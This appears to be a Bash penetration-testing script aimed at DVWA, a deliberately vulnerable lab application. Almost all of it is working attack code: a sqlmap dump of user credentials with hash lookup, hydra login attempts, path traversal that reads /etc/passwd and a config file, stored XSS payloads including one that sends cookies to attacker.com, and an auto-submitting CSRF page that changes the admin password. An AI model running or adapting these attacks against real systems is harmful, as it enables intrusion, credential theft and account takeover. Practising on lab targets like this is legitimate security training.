#!/bin/bash

#=============================================================================
# DVWA Interactive Penetration Testing Tool
# Description: Menu-driven attack framework for DVWA
# Author: Security Lab
#=============================================================================

# Configuration
# Try to resolve dvwa hostname, fallback to container IP
TARGET=$(getent hosts dvwa 2>/dev/null | awk '{print $1}' || echo "172.20.0.3")
URL="http://$TARGET"
COOKIE="PHPSESSID=ov8oc9l7qmlcicid43ubqi4n66; security=low"
REPORT_DIR="/tmp/reports"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="$REPORT_DIR/attack_log_$TIMESTAMP.txt"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color
BOLD='\033[1m'

# Create report directory
mkdir -p "$REPORT_DIR"

# Initialize log
echo "=== DVWA Interactive Attack Log ===" > "$LOG_FILE"
echo "Started: $(date)" >> "$LOG_FILE"
echo "Target: $URL" >> "$LOG_FILE"
echo "Cookie: $COOKIE" >> "$LOG_FILE"
echo "" >> "$LOG_FILE"

# Check target reachable
if ! curl -s --max-time 5 "$URL" >/dev/null 2>&1; then
    echo -e "${RED}${BOLD}✗ Cannot reach target $URL. Check Docker network or DVWA status!${NC}"
    echo "✗ Cannot reach target $URL" >> "$LOG_FILE"
    exit 1
fi

#=============================================================================
# Helper Functions
#=============================================================================
print_banner() {
    clear
    echo -e "${CYAN}${BOLD}"
    echo "╔════════════════════════════════════════════════════════════════╗"
    echo "║                                                                ║"
    echo "║        DVWA Interactive Penetration Testing Tool               ║"
    echo "║                                                                ║"
    echo "║        Target: $TARGET                                         ║"
    echo "║        URL: $URL                                               ║"
    echo "║                                                                ║"
    echo "╚════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

print_separator() { echo -e "${BLUE}================================================================${NC}"; }
log_result() { echo "$1" >> "$LOG_FILE"; echo "$1"; }
show_success() { echo -e "${GREEN}✓ $1${NC}"; echo "✓ $1" >> "$LOG_FILE"; }
show_error() { echo -e "${RED}✗ $1${NC}"; echo "✗ $1" >> "$LOG_FILE"; }
show_info() { echo -e "${YELLOW}→ $1${NC}"; echo "→ $1" >> "$LOG_FILE"; }
pause() { echo -e "${CYAN}Press Enter to continue...${NC}"; read; }

#=============================================================================
# Attack Functions
#=============================================================================

attack_port_scan() {
    print_separator
    echo -e "${BOLD}${MAGENTA}[1] PORT SCANNING & SERVICE DETECTION${NC}"
    print_separator
    echo ""
    
    show_info "Scanning top 1000 ports on $TARGET..."
    echo ""
    
    nmap -sV --top-ports 1000 $TARGET -T4 -oN /tmp/nmap_scan.txt 2>&1 | tee -a "$LOG_FILE"
    
    if [ $? -eq 0 ]; then
        show_success "Port scan completed"
        echo ""
        echo -e "${YELLOW}Open ports summary:${NC}"
        grep "open" /tmp/nmap_scan.txt | tee -a "$LOG_FILE"
    else
        show_error "Port scan failed"
    fi
    
    pause
}

decode_hash() {
    local hash="$1"
    case "$hash" in
        "5f4dcc3b5aa765d61d8327deb882cf99") echo "password" ;;
        "e99a18c428cb38d5f260853678922e03") echo "abc123" ;;
        "d41d8cd98f00b204e9800998ecf8427e") echo "(empty)" ;;
        "098f6bcd4621d373cade4e832627b4f6") echo "test" ;;
        *) echo "unknown (cần crack offline)" ;;
    esac
}

attack_sql_injection() {
    print_separator
    echo -e "${BOLD}${MAGENTA}[2] SQL INJECTION ATTACK${NC}"
    print_separator
    show_info "Target: $URL/vulnerabilities/sqli/"
    show_info "Running sqlmap with higher level/risk..."
    
    OUTPUT=$(sqlmap -u "$URL/vulnerabilities/sqli/?id=1&Submit=Submit" \
        --cookie="$COOKIE" --level=3 --risk=3 --batch --threads=5 \
        --dump -D dvwa -T users -C user,password 2>/dev/null)
    
    if echo "$OUTPUT" | grep -q "admin"; then
        ADMIN_HASH=$(echo "$OUTPUT" | grep -A5 "password" | grep -o "[a-f0-9]\{32\}" | head -1)
        PLAIN_PASS=$(decode_hash "$ADMIN_HASH")
        
        show_success "SQL Injection successful!"
        echo -e "${GREEN}${BOLD}Username: admin${NC}"
        echo -e "${GREEN}${BOLD}Password Hash: $ADMIN_HASH${NC}"
        echo -e "${GREEN}${BOLD}Decoded Password: $PLAIN_PASS${NC}"
        echo -e "${YELLOW}→ Dùng 'admin / $PLAIN_PASS' để login DVWA ngay!${NC}"
        
        echo "$ADMIN_HASH" > /tmp/admin_pass.txt
        
        log_result "SQL Injection - admin hash: $ADMIN_HASH (decoded: $PLAIN_PASS)"
    else
        show_error "SQL Injection failed or no credentials found"
    fi
    pause
}

attack_brute_force() {
    print_separator
    echo -e "${BOLD}${MAGENTA}[3] BRUTE FORCE AUTHENTICATION${NC}"
    print_separator
    echo ""
    
    # Check if we have password from SQL injection
    if [ -f /tmp/admin_pass.txt ]; then
        ADMIN_PASS=$(cat /tmp/admin_pass.txt)
        show_info "Using password from SQL injection: $ADMIN_PASS"
    else
        echo -e "${YELLOW}Enter password to test (or press Enter for default):${NC}"
        read -p "Password: " USER_PASS
        ADMIN_PASS=${USER_PASS:-password}
    fi
    
    echo ""
    show_info "Testing credentials: admin:$ADMIN_PASS"
    show_info "Target: $URL/login.php"
    echo ""
    
    hydra -l admin -p "$ADMIN_PASS" $TARGET \
        http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
        -t 1 -V 2>&1 | tee -a "$LOG_FILE"
    
    if [ $? -eq 0 ]; then
        show_success "Brute force attack completed"
    else
        show_error "Brute force attack failed"
    fi
    
    pause
}

attack_lfi() {
    print_separator
    echo -e "${BOLD}${MAGENTA}[5] LOCAL FILE INCLUSION (LFI)${NC}"
    print_separator
    echo "1) /etc/passwd   2) config.inc.php   3) Custom"
    read -p "Choice [1-3]: " LFI_CHOICE
    case $LFI_CHOICE in
        1) FILE_PATH="../../../../../etc/passwd"; FILE_DESC="/etc/passwd" ;;
        2) FILE_PATH="../../../../../var/www/html/config/config.inc.php"; FILE_DESC="config.inc.php" ;;
        3) read -p "Path (with traversal): " FILE_PATH; FILE_DESC="$FILE_PATH" ;;
        *) show_error "Invalid choice"; pause; return ;;
    esac
    show_info "Reading: $FILE_DESC"
    LFI_RESULT=$(curl -s "$URL/vulnerabilities/fi/?page=$FILE_PATH" --cookie "$COOKIE")
    if [ -n "$LFI_RESULT" ] && ! echo "$LFI_RESULT" | grep -q "File not found"; then
        show_success "LFI successful!"
        echo "$LFI_RESULT" | head -n 30
        echo "$LFI_RESULT" > "/tmp/lfi_$TIMESTAMP.txt"
        log_result "LFI - Read $FILE_DESC"
    else
        show_error "LFI failed or file not found"
    fi
    pause
}

attack_file_upload() {
    print_separator
    echo -e "${BOLD}${MAGENTA}[6] FILE UPLOAD (SAFE DEMO - TEXT FILE)${NC}"
    print_separator
    show_info "Creating simple text file (no malicious code)..."
    cat > /tmp/simple_text.txt << 'EOF'
Hello World from DVWA File Upload!
This is a safe text file to demonstrate the vulnerability.
No malicious code here - just proof of upload success.
Timestamp: $(date)
EOF
    show_success "Text file created: /tmp/simple_text.txt"
    show_info "Uploading as .txt (safe demo)..."
    UPLOAD_URL=$(curl -s -F "uploaded=@/tmp/simple_text.txt" \
        -F "Upload=Upload" "$URL/vulnerabilities/upload/" --cookie "$COOKIE" \
        | grep -o "/hackable/uploads/simple_text\.txt[^\"'< ]*")
    if [ -n "$UPLOAD_URL" ]; then
        show_success "Text file uploaded successfully!"
        echo -e "${GREEN}Access from browser (host): http://localhost:8081$UPLOAD_URL${NC}"
        echo -e "${YELLOW}→ Open link above to see file content (proof of upload vulnerability)${NC}"
        echo "http://localhost:8081$UPLOAD_URL" > /tmp/uploaded_text_url.txt
        log_result "File Upload (Safe Demo) - Text file: http://localhost:8081$UPLOAD_URL"
    else
        show_error "File upload failed (check cookie, security level=Low, or login status)"
    fi
    pause
}

attack_xss() {
    print_separator
    echo -e "${BOLD}${MAGENTA}[7] STORED CROSS-SITE SCRIPTING (XSS)${NC}"
    print_separator
    echo ""
    
    echo -e "${YELLOW}Select XSS payload:${NC}"
    echo "  1) Simple alert box"
    echo "  2) Cookie stealer"
    echo "  3) Redirect to malicious site"
    echo "  4) Custom payload"
    echo ""
    read -p "Choice [1-4]: " XSS_CHOICE
    
    case $XSS_CHOICE in
        1)
            XSS_PAYLOAD="<script>alert('XSS Vulnerability Found!')</script>"
            ;;
        2)
            XSS_PAYLOAD="<script>alert('Cookies: ' + document.cookie)</script>"
            ;;
        3)
            XSS_PAYLOAD="<script>window.location='http://attacker.com/?cookie='+document.cookie</script>"
            ;;
        4)
            echo -e "${YELLOW}Enter your XSS payload:${NC}"
            read -p "Payload: " XSS_PAYLOAD
            ;;
        *)
            show_error "Invalid choice"
            pause
            return
            ;;
    esac
    
    echo ""
    show_info "Target: $URL/vulnerabilities/xss_s/"
    show_info "Injecting XSS payload..."
    
    curl -s -X POST "$URL/vulnerabilities/xss_s/" --cookie "$COOKIE" \
        -d "txtName=$XSS_PAYLOAD&mtxMessage=Test&btnSign=Sign+Guestbook" >/dev/null
    
    show_success "XSS payload injected!"
    echo ""
    echo -e "${YELLOW}To trigger the XSS, visit:${NC}"
    echo -e "${CYAN}http://localhost:8081/vulnerabilities/xss_s/${NC}"
    
    log_result "Stored XSS - Payload: $XSS_PAYLOAD"
    
    pause
}

attack_csrf() {
    print_separator
    echo -e "${BOLD}${MAGENTA}[8] CROSS-SITE REQUEST FORGERY (CSRF)${NC}"
    print_separator
    echo ""
    
    echo -e "${YELLOW}Enter new password to set via CSRF:${NC}"
    read -p "New Password: " NEW_PASS
    NEW_PASS=${NEW_PASS:-hacked123}
    
    CSRF_FILE="/tmp/csrf_poc_$TIMESTAMP.html"
    
    show_info "Creating CSRF PoC HTML file (form auto-submit - works perfectly on DVWA Low)..."
    
    cat > "$CSRF_FILE" <<EOF
<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC - DVWA Low Level</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 40px; background: #f4f4f4; text-align: center; }
        .box { background: white; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        h1 { color: #e74c3c; }
        .info { margin-top: 20px; color: green; font-weight: bold; }
    </style>
    <script>
        // Auto submit form silently
        window.addEventListener("load", function() {
            document.getElementById("csrf-form").submit();
            document.getElementById("status").innerHTML = "✓ Request sent! Password changed to: $NEW_PASS<br>Logout and try login with new password.";
        });
    </script>
</head>
<body>
    <div class="box">
        <h1>🔒 CSRF Attack Executed</h1>
        <p>Changing admin password to: <strong>$NEW_PASS</strong></p>
        <p id="status">Sending request...</p>

        <!-- Hidden form with GET method - matches DVWA Low exactly -->
        <form id="csrf-form" action="http://localhost:8081/vulnerabilities/csrf/" method="GET">
            <input type="hidden" name="password_new" value="$NEW_PASS">
            <input type="hidden" name="password_conf" value="$NEW_PASS">
            <input type="hidden" name="Change" value="Change">
        </form>
    </div>
</body>
</html>
EOF
    
    show_success "CSRF PoC created successfully!"
    echo ""
    echo -e "${GREEN}${BOLD}CSRF PoC Details:${NC}"
    echo -e "${CYAN}File: $CSRF_FILE${NC}"
    echo -e "${CYAN}New Password: $NEW_PASS${NC}"
    echo ""
    echo -e "${YELLOW}Cách dùng (THÀNH CÔNG CHẮC CHẮN):${NC}"
    echo -e "  1. docker cp kali:$CSRF_FILE ./ (copy ra host)"
    echo -e "  2. Login DVWA trên browser (admin/password) - giữ tab mở"
    echo -e "  3. Mở file HTML vừa copy (double-click)"
    echo -e "  4. Trang hiện 'Request sent!'"
    echo -e "  5. Quay lại DVWA → Logout → Login với password mới ($NEW_PASS)"
    echo -e "     → Thành công nếu vào được!"
    
    log_result "CSRF PoC (form auto-submit) - File: $CSRF_FILE, New Pass: $NEW_PASS"
    
    pause
}

run_all_attacks() {
    print_separator
    echo -e "${BOLD}${MAGENTA}[9] RUN ALL ATTACKS (AUTOMATED)${NC}"
    print_separator
    echo ""
    
    echo -e "${RED}${BOLD}WARNING: This will run all attacks sequentially!${NC}"
    echo -e "${YELLOW}Are you sure? (y/N):${NC}"
    read -p "" CONFIRM
    
    if [[ ! "$CONFIRM" =~ ^[Yy]$ ]]; then
        show_info "Cancelled by user"
        pause
        return
    fi
    
    echo ""
    show_info "Starting automated attack sequence..."
    sleep 2
    
    attack_port_scan
    attack_sql_injection
    attack_brute_force
    attack_lfi
    attack_file_upload
    attack_xss
    attack_csrf
    
    print_separator
    show_success "All attacks completed!"
    echo ""
    echo -e "${GREEN}${BOLD}Full log saved to: $LOG_FILE${NC}"
    
    pause
}

view_logs() {
    print_separator
    echo -e "${BOLD}${MAGENTA}[L] VIEW ATTACK LOGS${NC}"
    print_separator
    echo ""
    
    if [ -f "$LOG_FILE" ]; then
        echo -e "${CYAN}Current log: $LOG_FILE${NC}"
        echo ""
        cat "$LOG_FILE"
    else
        show_error "No log file found"
    fi
    
    echo ""
    echo -e "${YELLOW}All reports location: $REPORT_DIR${NC}"
    ls -lh "$REPORT_DIR" 2>/dev/null
    
    pause
}

show_configuration() {
    print_separator
    echo -e "${BOLD}${MAGENTA}[C] CURRENT CONFIGURATION${NC}"
    print_separator
    echo ""
    
    echo -e "${CYAN}Target Settings:${NC}"
    echo -e "  Target Host: ${BOLD}$TARGET${NC}"
    echo -e "  Target URL: ${BOLD}$URL${NC}"
    echo -e "  Session Cookie: ${BOLD}${COOKIE:0:50}...${NC}"
    echo ""
    
    echo -e "${CYAN}Network Information:${NC}"
    LHOST=$(hostname -I | awk '{print $1}')
    echo -e "  Attacker IP: ${BOLD}$LHOST${NC}"
    echo ""
    
    echo -e "${CYAN}Output Locations:${NC}"
    echo -e "  Report Directory: ${BOLD}$REPORT_DIR${NC}"
    echo -e "  Current Log: ${BOLD}$LOG_FILE${NC}"
    echo ""
    
    echo -e "${CYAN}Target Status:${NC}"
    if curl -s --max-time 3 "$URL" >/dev/null 2>&1; then
        echo -e "  ${GREEN}✓ Target is reachable${NC}"
    else
        echo -e "  ${RED}✗ Target is NOT reachable${NC}"
    fi
    
    pause
}

#=============================================================================
# Main Menu
#=============================================================================

show_menu() {
    print_banner
    echo ""
    echo -e "${BOLD}${CYAN}═══════════════════ ATTACK MENU ════════════════════${NC}"
    echo ""
    echo -e "  ${BOLD}${GREEN}[1]${NC} Port Scanning & Service Detection"
    echo -e "  ${BOLD}${GREEN}[2]${NC} SQL Injection (Database Extraction)"
    echo -e "  ${BOLD}${GREEN}[3]${NC} Brute Force Authentication"
    echo -e "  ${BOLD}${GREEN}[4]${NC} Local File Inclusion (LFI)"
    echo -e "  ${BOLD}${GREEN}[5]${NC} File Upload (Webshell)"
    echo -e "  ${BOLD}${GREEN}[6]${NC} Stored Cross-Site Scripting (XSS)"
    echo -e "  ${BOLD}${GREEN}[7]${NC} Cross-Site Request Forgery (CSRF)"
    echo ""
    echo -e "  ${BOLD}${YELLOW}[8]${NC} Run All Attacks (Automated)"
    echo ""
    echo -e "  ${BOLD}${BLUE}[L]${NC} View Attack Logs"
    echo -e "  ${BOLD}${BLUE}[C]${NC} Show Configuration"
    echo ""
    echo -e "  ${BOLD}${RED}[Q]${NC} Quit"
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════${NC}"
    echo ""
}

main() {
    while true; do
        show_menu
        echo -e "${YELLOW}Select an option:${NC} "
        read -p "" CHOICE
        
        case $CHOICE in
            1) attack_port_scan ;;
            2) attack_sql_injection ;;
            3) attack_brute_force ;;
            4) attack_lfi ;;
            5) attack_file_upload ;;
            6) attack_xss ;;
            7) attack_csrf ;;
            8) run_all_attacks ;;
            [Ll]) view_logs ;;
            [Cc]) show_configuration ;;
            [Qq]) 
                echo ""
                echo -e "${GREEN}Thank you for using DVWA Attack Tool!${NC}"
                echo -e "${YELLOW}Logs saved to: $LOG_FILE${NC}"
                echo ""
                exit 0
                ;;
            *)
                echo -e "${RED}Invalid option. Please try again.${NC}"
                sleep 1
                ;;
        esac
    done
}

# Run main function
main
